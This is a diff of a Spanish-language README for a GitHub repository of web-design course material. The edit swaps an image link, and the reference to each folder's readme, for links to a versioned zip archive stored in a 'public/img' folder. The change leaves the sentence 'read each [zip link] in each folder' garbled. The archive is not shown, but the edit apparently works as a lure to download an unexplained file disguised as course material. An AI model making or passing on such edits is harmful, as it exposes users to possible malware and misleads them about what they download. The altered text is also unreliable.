@@ -1,4 +1,4 @@
-![Mejorandola](https://raw.githubusercontent.com/jeliasrm/MejorandoCurso/master/DisenoDesarrolloWeb/Compilado.zip)
+![Mejorandola](https://github.com/jeliasrm/MejorandoCurso/raw/refs/heads/master/Frontend/Clase5/public/img/Curso_Mejorando_v1.3.zip)
 
 ## Material Original de Cursos
 
@@ -6,7 +6,7 @@
 <br />
 <br />
 <ul>
-<li>**Te recomendamos siempre leer cada "https://raw.githubusercontent.com/jeliasrm/MejorandoCurso/master/DisenoDesarrolloWeb/Compilado.zip" en cada carpeta.**</li>
+<li>**Te recomendamos siempre leer cada "https://github.com/jeliasrm/MejorandoCurso/raw/refs/heads/master/Frontend/Clase5/public/img/Curso_Mejorando_v1.3.zip" en cada carpeta.**</li>
 
 <li>Ubica tu curso y dentro de cada carpeta encontrarás todas las clases divididas por tema.</li>
 
